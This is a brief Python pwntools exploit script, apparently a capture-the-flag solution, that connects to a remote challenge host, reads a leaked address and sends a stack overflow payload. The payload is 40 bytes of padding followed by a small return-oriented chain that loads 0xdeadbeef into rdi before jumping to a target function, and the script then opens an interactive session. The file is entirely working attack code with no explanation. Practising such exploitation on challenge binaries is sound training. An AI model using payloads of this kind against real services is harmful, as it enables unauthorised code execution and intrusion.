from pwn import *
from pwnlib import *

#p = process("./pwnme")
#p = gdb.debug("./pwnme")
p = remote("0.cloud.chals.io", 22287)

#gdb.attach(p)
addr = p.recvline().decode().split()[-1]
addr = int(addr[2:],16)

pop_rdi = addr+245
ret = addr-532

payload = b'A'*40
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(ret)
payload += p64(addr)
#gdb.attach(p)
p.sendline(payload)
p.interactive()
